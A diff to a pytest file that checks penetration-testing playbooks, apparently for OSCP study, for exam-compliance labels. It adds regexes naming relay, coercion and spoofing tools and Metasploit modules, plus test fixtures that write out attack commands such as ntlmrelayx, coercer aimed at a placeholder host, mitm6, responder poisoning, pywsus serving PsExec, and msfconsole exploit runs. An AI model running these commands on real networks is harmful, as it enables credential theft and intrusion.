@@ -4,6 +4,8 @@ import tomllib
 from datetime import date
 from urllib.parse import urlparse
 
+import pytest
+
 from conftest import REPO
 
 import build
@@ -178,7 +180,35 @@ def profile_problems(repo, profiles):
     return sorted(problems)
 
 
-def command_label_problems(text):
+# A tool, module or option that relays, coerces, poisons or spoofs, wherever a line names it: as a
+# command, in a check or in a sentence.
+_RESTRICTED_ANYWHERE = re.compile(
+    r"ntlmrelayx|krbrelay|\bcertipy\s+relay\b|\bcoercer\b|petitpotam|coerce_plus|printerbug"
+    r"|dfscoerce|shadowcoerce|--gen-relay-list|\bmitm6\b|\bbettercap\b|\bettercap\b|\barpspoof\b"
+    r"|\bpywsus\b",
+    re.I,
+)
+# a Metasploit module by its path, such as auxiliary/admin/mssql/mssql_escalate_execute_as
+_MSF_MODULE = re.compile(r"\b(?:exploit|auxiliary|post)/[a-z0-9_]+/[a-z0-9_/]+")
+_POINTER = re.compile(r":Pb ([a-z0-9]+(?:-[a-z0-9]+)*)")
+_INSTALL = re.compile(r"\btool install ([a-z0-9]+(?:[.-][a-z0-9]+)*)")
+# words that follow "tool install" in a sentence and are not a package, as in "as tool install
+# prints it"
+NOT_A_PACKAGE = {"prints"}
+
+
+def off_exam_playbooks(profiles):
+    """The file names of the playbooks that are off the exam as a whole."""
+    return frozenset(
+        path.rsplit("/", 1)[-1]
+        for path, entry in profiles["playbooks"].items()
+        if entry.get("exam") in {"prohibited", "outside-current-exam"}
+    )
+
+
+def command_label_problems(text, off_exam=frozenset()):
+    """Lines that need an exam label and have none in their section or before the first heading.
+    off_exam is the playbooks a :Pb pointer may only name under a label."""
     problems = []
     labels = {"*": []}
     section = "*"
@@ -193,20 +223,30 @@ def command_label_problems(text):
     for number, line in enumerate(text.splitlines(), start=1):
         if line.startswith("## "):
             section = line[3:]
+        if line.startswith("- [ ] ") and line[6:].startswith(LABEL_PREFIXES):
+            continue
         applicable = labels["*"] + labels.get(section, [])
         prohibited = bool(re.match(r"^(?:sudo\s+)?(?:\S*/)?(?:sqlmap|sstimap|nuclei)(?:\s|$)", line, re.I))
-        if re.match(r"^sudo\s+responder\b", line) and not re.search(r"(?:^|\s)-A(?:\s|$)", line):
+        if re.search(r"\bresponder\s+-I\b", line) and not re.search(r"(?:^|\s)-A(?:\s|$)", line):
             prohibited = True
-        if re.match(r"^(?:sudo\s+)?\S*ntlmrelayx\b|^certipy\s+relay\b", line):
+        if _RESTRICTED_ANYWHERE.search(line):
             prohibited = True
-        if re.match(r"^nxc\s+.*(?:-M\s+coerce_plus|--gen-relay-list)(?:\s|$)", line):
+        if any(name in off_exam for name in _POINTER.findall(line)):
             prohibited = True
-        conditional = bool(re.match(r"^msfconsole\b|^msfvenom\s+.*meterpreter|^portfwd\s+add\b", line, re.I))
+        conditional = bool(re.match(r"^msfvenom\s+.*meterpreter|^portfwd\s+add\b", line, re.I))
+        if re.search(r"\bmsfconsole\b", line) or _MSF_MODULE.search(line):
+            conditional = True
         if prohibited and not any(label.startswith(LABEL_PREFIXES[0]) for label in applicable):
-            problems.append(f"line {number}: restricted command has no Not on the OSCP exam label")
+            problems.append(f"line {number}: restricted step has no Not on the OSCP exam label")
         if conditional and not any(label.startswith(LABEL_PREFIXES) for label in applicable):
-            problems.append(f"line {number}: Metasploit command has no one-target label")
+            problems.append(f"line {number}: Metasploit step has no one-target label")
     return problems
+
+
+def install_problems(text, requires_tools):
+    """Each package a playbook installs with tool install must be in its requires_tools."""
+    installed = set(_INSTALL.findall(text)) - NOT_A_PACKAGE
+    return [f"tool install {name} is not in requires_tools" for name in sorted(installed - set(requires_tools))]
 
 
 def test_repository_profiles_labels_and_required_topics():
@@ -217,8 +257,24 @@ def test_repository_profiles_labels_and_required_topics():
 
 
 def test_known_restricted_commands_are_labelled():
+    off_exam = off_exam_playbooks(load_profiles())
+    assert off_exam >= {"ntlm-relay", "coercion", "sqlmap"}
     for file in REPO.joinpath("playbooks").rglob("*.md"):
-        assert command_label_problems(file.read_text(encoding="utf-8")) == [], file
+        assert command_label_problems(file.read_text(encoding="utf-8"), off_exam) == [], file
+
+
+def test_every_tool_a_playbook_installs_is_in_its_requires_tools():
+    entries = load_profiles()["playbooks"]
+    for file in sorted(REPO.joinpath("playbooks").rglob("*.md")):
+        path = file.relative_to(REPO / "playbooks").with_suffix("").as_posix()
+        text = file.read_text(encoding="utf-8")
+        assert install_problems(text, entries[path]["requires_tools"]) == [], path
+
+
+def test_an_installed_tool_missing_from_requires_tools_fails():
+    text = "# LAPS\n\nAt the pwn-broker prompt: tool install netexec and tool install evil-winrm-py.\n"
+    assert install_problems(text, ["netexec"]) == ["tool install evil-winrm-py is not in requires_tools"]
+    assert install_problems("- [ ] The full path, as tool install prints it\n", []) == []
 
 
 def test_exam_checkboxes_use_one_convention():
@@ -250,3 +306,64 @@ def test_required_topic_disappearing_fails():
 def test_restricted_command_without_label_fails():
     text = "# ADCS\n\n## ESC8\ncertipy relay -target 'http://<DCIP>'\n"
     assert command_label_problems(text)
+
+
+RELAY_LABEL = "- [ ] Not on the OSCP exam: relay is kept out as a safe reading; OffSec's pages do not name it\n"
+
+
+@pytest.mark.parametrize(
+    "line",
+    [
+        "- [ ] WSUS on plain HTTP: bettercap in the middle of the update channel first",
+        "pywsus -H <LHOST> -p 8530 -e PsExec64.exe -c 'x'",
+        "- [ ] KrbRelayUp on an unpatched build: a local relay, then SYSTEM",
+        "- [ ] Run it with sudo: sudo /opt/pwn-broker/bin/impacket-ntlmrelayx -tf relay.txt",
+        "- [ ] The same with Coercer: coercer coerce -l <LHOST> -t <TargetIP>",
+        "sudo mitm6 -d <Domain>",
+        "- [ ] Poison first: sudo responder -I tun0",
+    ],
+)
+def test_a_restricted_tool_needs_a_label_wherever_the_line_names_it(line):
+    text = f"# SCCM\n\n## A section\n{line}\n"
+    assert command_label_problems(text) == ["line 4: restricted step has no Not on the OSCP exam label"]
+    assert command_label_problems(f"# SCCM\n\n## A section\n{RELAY_LABEL}{line}\n") == []
+    assert command_label_problems(f"# SCCM\n\n{RELAY_LABEL}\n## A section\n{line}\n") == []
+
+
+def test_a_label_in_another_section_does_not_cover_the_line():
+    text = f"# SCCM\n\n## One\n{RELAY_LABEL}\n## Two\nsudo mitm6 -d <Domain>\n"
+    assert command_label_problems(text) == ["line 7: restricted step has no Not on the OSCP exam label"]
+
+
+def test_a_pointer_to_an_off_exam_playbook_needs_a_label():
+    off_exam = frozenset({"ntlm-relay", "coercion"})
+    text = "# MSSQL\n\n## The hash\n- [ ] Cracked: :Pb responder\n- [ ] Or relayed: :Pb ntlm-relay\n"
+    assert command_label_problems(text, off_exam) == [
+        "line 5: restricted step has no Not on the OSCP exam label"
+    ]
+    assert command_label_problems(text.replace("- [ ] Or", RELAY_LABEL + "- [ ] Or"), off_exam) == []
+    assert command_label_problems("# x\n\n## Next\n- [ ] On to :Pb delegation\n", off_exam) == []
+
+
+def test_analyze_mode_and_look_alike_names_need_no_label():
+    text = (
+        "# x\n\n## A section\nsudo responder -I tun0 -A\n.\\CoercedPotato_x64.exe -c whoami\n"
+        "- [ ] signing:False on a host: a candidate for NTLM relay\n"
+        "searchsploit -m windows/local/12345.py\n"
+    )
+    assert command_label_problems(text) == []
+
+
+@pytest.mark.parametrize(
+    "line",
+    [
+        "- [ ] Metasploit does it too: auxiliary/admin/mssql/mssql_escalate_execute_as",
+        "msfconsole -q -x 'use exploit/linux/misc/saltstack_salt_unauth_rce; run'",
+        "- [ ] Or in one line: msfconsole -q -x 'use exploit/multi/handler; run'",
+    ],
+)
+def test_a_metasploit_module_needs_a_label_wherever_the_line_names_it(line):
+    text = f"# MSSQL\n\n## Become them\n{line}\n"
+    assert command_label_problems(text) == ["line 4: Metasploit step has no one-target label"]
+    label = "- [ ] OSCP one-target limit: this Metasploit auxiliary module spends my one target, even if it fails\n"
+    assert command_label_problems(text + label) == []
